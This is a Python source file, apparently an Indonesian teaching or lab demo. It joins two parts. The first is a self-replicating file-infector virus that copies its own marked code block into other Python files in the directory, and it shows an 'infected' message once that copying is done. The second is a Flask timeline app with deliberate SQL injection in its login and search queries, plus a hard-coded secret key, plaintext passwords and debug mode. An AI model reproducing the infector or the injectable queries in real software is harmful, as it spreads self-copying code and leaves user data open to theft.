# ===========================================================
# BAGIAN 1: KODE VIRUS
# Virus akan berjalan pertama kali saat skrip dieksekusi.
# ===========================================================
import sys
import glob
import os

# --- Variabel Global sebagai 'Bendera' untuk Komunikasi ---
# Virus akan mengubah nilainya menjadi True saat infeksi total
VIRUS_PAYLOAD_SHOULD_ACTIVATE = False

# --- Logika Virus ---
# VIRUS SAYS HI!

def run_virus_logic():
    """
    Mengelola replikasi virus dan mengubah bendera global saat infeksi total.
    """
    global VIRUS_PAYLOAD_SHOULD_ACTIVATE
    try:
        # Ekstrak kode virus untuk disalin
        virus_code_to_replicate = []
        with open(sys.argv[0], 'r', encoding='utf-8') as f:
            lines = f.readlines()
        is_virus_section = False
        for line in lines:
            if line.strip() == "# VIRUS SAYS HI!":
                is_virus_section = True
            if is_virus_section:
                virus_code_to_replicate.append(line)
            if line.strip() == "# VIRUS SAYS BYE!":
                break
        
        if not virus_code_to_replicate:
            return

        # Periksa dan infeksi file Python
        python_files = glob.glob('.py') + glob.glob('.pyw')
        uninfected_files_found = False
        target_files = [f for f in python_files if os.path.abspath(f) != os.path.abspath(sys.argv[0])]

        if not target_files:
            VIRUS_PAYLOAD_SHOULD_ACTIVATE = True
            return

        for file_path in target_files:
            with open(file_path, 'r', encoding='utf-8') as f:
                is_infected = any(line.strip() == "# VIRUS SAYS HI!" for line in f)
            if not is_infected:
                uninfected_files_found = True
                # Lakukan infeksi
                with open(file_path, 'r', encoding='utf-8') as f_read:
                    file_code = f_read.readlines()
                final_code = virus_code_to_replicate + ['\n'] + file_code
                with open(file_path, 'w', encoding='utf-8') as f_write:
                    f_write.writelines(final_code)

        # Jika tidak ada file yang belum terinfeksi, aktifkan bendera payload
        if not uninfected_files_found:
            VIRUS_PAYLOAD_SHOULD_ACTIVATE = True
            
    except Exception:
        pass

# Panggil logika utama virus untuk memulai proses
run_virus_logic()

# VIRUS SAYS BYE!
# --- Akhir Logika Virus ---


# ===========================================================
# BAGIAN 2: KODE APLIKASI FLASK
# Kode Flask akan didefinisikan dan dijalankan setelah virus selesai.
# ===========================================================

import sqlite3
from flask import Flask, redirect, request, session, render_template

# Definisi Aplikasi Flask
app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

# Fungsi-fungsi Helper untuk Database dan Aplikasi
def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT    NOT NULL UNIQUE,
                password TEXT    NOT NULL
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS time_line(
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id  INTEGER NOT NULL,
                content  TEXT    NOT NULL,
                FOREIGN KEY(user_id) REFERENCES user(id)
            )
        ''')
        conn.commit()

def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany(
            'INSERT OR IGNORE INTO user(username, password) VALUES (?,?)',
            [('alice','alicepw'), ('bob','bobpw')]
        )
        cur.executemany(
            'INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)',
            [(1,'Hello world'), (2,'Hi there')]
        )
        conn.commit()

def authenticate(username, password):
    with connect_db() as conn:
        cur = conn.cursor()
        # VULNERABLE: raw SQL query with user input directly interpolated
        query = f"SELECT id, username FROM user WHERE username='{username}' AND password='{password}'"
        cur.execute(query)
        row = cur.fetchone()
        return dict(row) if row else None

def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO time_line(user_id, content) VALUES (?,?)',
            (uid, content)
        )
        conn.commit()

def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]

def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'DELETE FROM time_line WHERE user_id=? AND id=?',
            (uid, tid)
        )
        conn.commit()

# Rute-rute Aplikasi Flask
@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    conn = connect_db()
    cur = conn.cursor()
    query = f"SELECT id, user_id, content FROM time_line WHERE content LIKE '%{keyword}%'"
    cur.execute(query)
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return {
        'query_used': query,
        'results': rows
    }

@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

# --- PERUBAHAN PADA RUTE UTAMA UNTUK PAYLOAD VIRUS ---
@app.route('/')
def index():
    if 'uid' in session:
        # Siapkan variabel untuk pesan virus
        virus_alert_message = None
        
        # Periksa bendera global yang diatur oleh virus
        if VIRUS_PAYLOAD_SHOULD_ACTIVATE:
            virus_alert_message = "YOU HAVE BEEN INFECTED HAHAHA !!!"
        
        tl = get_time_lines()
        # Teruskan variabel pesan ke template saat me-render
        return render_template('index.html', user=session['username'], tl=tl, virus_alert=virus_alert_message)
    return redirect('/login')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            session['uid'] = user['id']
            session['username'] = user['username']
            return redirect('/')
    return '''
<form method="post">
  <input name="username" placeholder="user"/><input name="password" type="password"/>
  <button>Login</button>
</form>
'''

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        create_time_line(session['uid'], request.form['content'])
    return redirect('/')

@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        delete_time_line(session['uid'], tid)
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

# Menjalankan Aplikasi
if __name__=='__main__':
    app.run(debug=True, use_reloader=False)